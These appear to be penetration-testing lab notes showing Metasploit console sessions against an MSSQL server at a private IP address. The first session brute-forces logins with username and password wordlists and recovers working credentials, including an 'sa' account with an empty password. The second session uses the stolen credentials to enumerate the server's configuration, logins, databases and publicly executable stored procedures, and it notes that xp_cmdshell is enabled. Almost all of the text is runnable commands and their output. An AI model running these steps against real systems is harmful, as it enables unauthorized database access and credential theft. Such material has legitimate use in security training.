# Metasploit

Brute force login

```
msf6 > use auxiliary/scanner/mssql/mssql_login 
msf6 auxiliary(scanner/mssql/mssql_login) > set rhosts 10.4.25.105
rhosts => 10.4.25.105
msf6 auxiliary(scanner/mssql/mssql_login) > set user_file /root/Desktop/wordlist/common_users.txt
user_file => /root/Desktop/wordlist/common_users.txt
msf6 auxiliary(scanner/mssql/mssql_login) > set pass_file /root/Desktop/wordlist/100-common-passwords.txt
pass_file => /root/Desktop/wordlist/100-common-passwords.txt
msf6 auxiliary(scanner/mssql/mssql_login) > set verbose false
verbose => false
msf6 auxiliary(scanner/mssql/mssql_login) > exploit

[*] 10.4.25.105:1433      - 10.4.25.105:1433 - MSSQL - Starting authentication scanner.
[+] 10.4.25.105:1433      - 10.4.25.105:1433 - Login Successful: WORKSTATION\sa:
[+] 10.4.25.105:1433      - 10.4.25.105:1433 - Login Successful: WORKSTATION\dbadmin:anamaria
[+] 10.4.25.105:1433      - 10.4.25.105:1433 - Login Successful: WORKSTATION\auditor:nikita
[*] 10.4.25.105:1433      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Admin enum

```
msf6 auxiliary(scanner/mssql/mssql_login) > use auxiliary/admin/mssql/mssql_enum
msf6 auxiliary(admin/mssql/mssql_enum) > set rhosts 10.4.25.105
rhosts => 10.4.25.105
msf6 auxiliary(admin/mssql/mssql_enum) > set username dbadmin
username => dbadmin
msf6 auxiliary(admin/mssql/mssql_enum) > set password anamaria
password => anamaria
msf6 auxiliary(admin/mssql/mssql_enum) > exploit
[*] Running module against 10.4.25.105

[*] 10.4.25.105:1433 - Running MS SQL Server Enumeration...
[*] 10.4.25.105:1433 - Version:
[*] Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
[*]     Sep 24 2019 13:48:23 
[*]     Copyright (C) 2019 Microsoft Corporation
[*]     Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)
[*] 10.4.25.105:1433 - Configuration Parameters:
[*] 10.4.25.105:1433 -  C2 Audit Mode is Not Enabled
[*] 10.4.25.105:1433 -  xp_cmdshell is Enabled
[*] 10.4.25.105:1433 -  remote access is Enabled
[*] 10.4.25.105:1433 -  allow updates is Not Enabled
[*] 10.4.25.105:1433 -  Database Mail XPs is Not Enabled
[*] 10.4.25.105:1433 -  Ole Automation Procedures are Not Enabled
[*] 10.4.25.105:1433 - Databases on the server:
[*] 10.4.25.105:1433 -  Database name:master
[*] 10.4.25.105:1433 -  Database Files for master:
[*] 10.4.25.105:1433 -      C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\master.mdf
[*] 10.4.25.105:1433 -      C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
[*] 10.4.25.105:1433 -  Database name:tempdb
[*] 10.4.25.105:1433 -  Database Files for tempdb:
[*] 10.4.25.105:1433 -      C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\tempdb.mdf
[*] 10.4.25.105:1433 -      C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\templog.ldf
[*] 10.4.25.105:1433 -  Database name:model
[*] 10.4.25.105:1433 -  Database Files for model:
[*] 10.4.25.105:1433 -  Database name:msdb
[*] 10.4.25.105:1433 -  Database Files for msdb:
[*] 10.4.25.105:1433 -      C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
[*] 10.4.25.105:1433 -      C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
[*] 10.4.25.105:1433 - System Logins on this Server:
[*] 10.4.25.105:1433 -  sa
[*] 10.4.25.105:1433 -  dbadmin
[*] 10.4.25.105:1433 - Disabled Accounts:
[*] 10.4.25.105:1433 -  No Disabled Logins Found
[*] 10.4.25.105:1433 - No Accounts Policy is set for:
[*] 10.4.25.105:1433 -  sa
[*] 10.4.25.105:1433 -  dbadmin
[*] 10.4.25.105:1433 - Password Expiration is not checked for:
[*] 10.4.25.105:1433 -  sa
[*] 10.4.25.105:1433 -  dbadmin
[*] 10.4.25.105:1433 - System Admin Logins on this Server:
[*] 10.4.25.105:1433 -  sa
[*] 10.4.25.105:1433 - Windows Logins on this Server:
[*] 10.4.25.105:1433 -  No Windows logins found!
[*] 10.4.25.105:1433 - Windows Groups that can logins on this Server:
[*] 10.4.25.105:1433 -  No Windows Groups where found with permission to login to system.
[*] 10.4.25.105:1433 - Accounts with Username and Password being the same:
[*] 10.4.25.105:1433 -  No Account with its password being the same as its username was found.
[*] 10.4.25.105:1433 - Accounts with empty password:
[*] 10.4.25.105:1433 -  No Accounts with empty passwords where found.
[*] 10.4.25.105:1433 - Stored Procedures with Public Execute Permission found:
[*] 10.4.25.105:1433 -  sp_replsetsyncstatus
[*] 10.4.25.105:1433 -  sp_replcounters
[*] 10.4.25.105:1433 -  sp_replsendtoqueue
[*] 10.4.25.105:1433 -  sp_resyncexecutesql
[*] 10.4.25.105:1433 -  sp_prepexecrpc
[*] 10.4.25.105:1433 -  sp_repltrans
[*] 10.4.25.105:1433 -  sp_xml_preparedocument
[*] 10.4.25.105:1433 -  xp_qv
[*] 10.4.25.105:1433 -  xp_getnetname
[*] 10.4.25.105:1433 -  sp_releaseschemalock
[*] 10.4.25.105:1433 -  sp_refreshview
[*] 10.4.25.105:1433 -  sp_replcmds
[*] 10.4.25.105:1433 -  sp_unprepare
[*] 10.4.25.105:1433 -  sp_resyncprepare
[*] 10.4.25.105:1433 -  sp_createorphan
[*] 10.4.25.105:1433 -  xp_dirtree
[*] 10.4.25.105:1433 -  sp_replwritetovarbin
[*] 10.4.25.105:1433 -  sp_replsetoriginator
[*] 10.4.25.105:1433 -  sp_xml_removedocument
[*] 10.4.25.105:1433 -  sp_repldone
[*] 10.4.25.105:1433 -  sp_reset_connection
[*] 10.4.25.105:1433 -  xp_fileexist
[*] 10.4.25.105:1433 -  xp_fixeddrives
[*] 10.4.25.105:1433 -  sp_getschemalock
[*] 10.4.25.105:1433 -  sp_prepexec
[*] 10.4.25.105:1433 -  xp_revokelogin
[*] 10.4.25.105:1433 -  sp_execute_external_script
[*] 10.4.25.105:1433 -  sp_resyncuniquetable
[*] 10.4.25.105:1433 -  sp_replflush
[*] 10.4.25.105:1433 -  sp_resyncexecute
[*] 10.4.25.105:1433 -  xp_grantlogin
[*] 10.4.25.105:1433 -  sp_droporphans
[*] 10.4.25.105:1433 -  xp_regread
[*] 10.4.25.105:1433 -  sp_getbindtoken
[*] 10.4.25.105:1433 -  sp_replincrementlsn
[*] 10.4.25.105:1433 - Instances found on this server:
[*] 10.4.25.105:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 10.4.25.105:1433 -  xp_regread might be disabled in this system
[*] Auxiliary module execution completed
```
